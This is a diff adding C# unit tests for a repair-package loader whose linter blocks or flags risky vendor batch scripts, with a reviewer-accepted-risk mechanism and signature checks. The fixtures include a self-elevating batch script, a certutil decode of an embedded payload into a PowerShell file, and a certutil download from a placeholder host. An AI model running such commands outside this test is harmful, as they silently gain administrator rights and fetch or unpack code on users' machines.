@@ -151,6 +151,87 @@ public sealed class RepairPackageLoaderTests : IDisposable
         Assert.Contains(status.Reasons, reason => reason.Contains("sign it again"));
     }
 
+    private const string SelfElevatingBat =
+        "@echo off\r\nnet session >nul 2>&1 || (powershell -Command \"Start-Process '%~f0' -Verb RunAs\" & exit /b)\r\nexit /b 0\r\n";
+
+    private static void AcceptRisks(JsonObject package, params string[] risks) =>
+        package["review"] = new JsonObject
+        {
+            ["reviewedBy"] = "Tester",
+            ["acceptedRisks"] = new JsonArray(risks.Select(risk => (JsonNode)risk).ToArray())
+        };
+
+    [Fact]
+    public async Task SelfElevatingBatIsBlockedUntilTheReviewerAcceptsTheRisk()
+    {
+        await WritePackageAsync("elevates", bat: SelfElevatingBat);
+        await WritePackageAsync("elevates-accepted", bat: SelfElevatingBat,
+            edit: package => AcceptRisks(package, BatRisks.SelfElevation));
+
+        var statuses = await CreateRepository().GetPackageStatusesAsync(
+            TestContext.Current.CancellationToken);
+        var published = await CreateRepository().GetRepairPackagesAsync(
+            TestContext.Current.CancellationToken);
+
+        Assert.Equal(BatPackageStatuses.LintRejected,
+            statuses.Single(item => item.Id == "elevates").Status);
+        var accepted = statuses.Single(item => item.Id == "elevates-accepted");
+        Assert.Equal(BatPackageStatuses.ReadyWithWarnings, accepted.Status);
+        Assert.Contains(accepted.Warnings, warning => warning.StartsWith("Accepted risk (self-elevation)"));
+        var package = Assert.Single(published);
+        Assert.Equal("elevates-accepted", package.Descriptor.PackageId);
+        Assert.Equal([BatRisks.SelfElevation], package.Descriptor.AcceptedRisks);
+        Assert.True(PackageSignaturePolicy.Verify(package.Descriptor, [TestPackageSigner.PublicKey]));
+    }
+
+    [Fact]
+    public async Task EncodedPayloadCanBeAcceptedButADownloadCannot()
+    {
+        await WritePackageAsync("payload", edit: package => AcceptRisks(package,
+                BatRisks.EmbeddedPayload),
+            bat: "@echo off\r\ncertutil -decode data.b64 run.ps1\r\nexit /b 0\r\n");
+        await WritePackageAsync("download", edit: package => AcceptRisks(package,
+                BatRisks.SelfElevation, BatRisks.EmbeddedPayload),
+            bat: "@echo off\r\ncertutil -urlcache -f http://example.test/x x\r\nexit /b 0\r\n");
+
+        var statuses = await CreateRepository().GetPackageStatusesAsync(
+            TestContext.Current.CancellationToken);
+
+        Assert.True(BatPackageStatuses.IsPublished(
+            statuses.Single(item => item.Id == "payload").Status));
+        var download = statuses.Single(item => item.Id == "download");
+        Assert.Equal(BatPackageStatuses.LintRejected, download.Status);
+        Assert.Contains(download.Reasons, reason => reason.Contains("cannot be accepted"));
+    }
+
+    [Fact]
+    public async Task OnlyKnownRisksMayBeAccepted()
+    {
+        await WritePackageAsync("bad-risk", edit: package => AcceptRisks(package, "network-download"));
+
+        var status = await SingleStatusAsync();
+
+        Assert.Equal(BatPackageStatuses.Invalid, status.Status);
+        Assert.Contains(status.Reasons, reason => reason.Contains("review.acceptedRisks may only contain"));
+    }
+
+    [Fact]
+    public async Task AddingAnAcceptedRiskAfterSigningInvalidatesTheSignature()
+    {
+        // Signed with no accepted risks, then a risk is added to package.json by hand.
+        await WritePackageAsync("tampered", bat: SelfElevatingBat);
+        var path = Path.Combine(_root, "packages", "tampered", "package.json");
+        var node = JsonNode.Parse(await File.ReadAllTextAsync(path,
+            TestContext.Current.CancellationToken))!.AsObject();
+        AcceptRisks(node, BatRisks.SelfElevation);
+        await File.WriteAllTextAsync(path, node.ToJsonString(),
+            TestContext.Current.CancellationToken);
+
+        var status = await SingleStatusAsync();
+
+        Assert.Equal(BatPackageStatuses.Unsigned, status.Status);
+    }
+
     [Fact]
     public async Task GuiExeCanOnlyRunWithoutInput()
     {
@@ -305,11 +386,12 @@ public sealed class RepairPackageLoaderTests : IDisposable
 
     private async Task<string> WritePackageAsync(string id, string? exe = null,
         BatchPlaybook? playbook = null, (string Name, string Content)? supportFile = null,
-        string? fileName = null, Action<JsonObject>? edit = null, bool sign = true)
+        string? fileName = null, Action<JsonObject>? edit = null, bool sign = true,
+        string? bat = null)
     {
         var folder = Directory.CreateDirectory(Path.Combine(_root, "packages", id)).FullName;
         fileName ??= exe is null ? "Vendor Tool.bat" : "Vendor Tool.exe";
-        var bytes = exe is null ? Encoding.ASCII.GetBytes(Bat)
+        var bytes = exe is null ? Encoding.ASCII.GetBytes(bat ?? Bat)
             : await File.ReadAllBytesAsync(exe, TestContext.Current.CancellationToken);
         await File.WriteAllBytesAsync(Path.Combine(folder, fileName), bytes,
             TestContext.Current.CancellationToken);
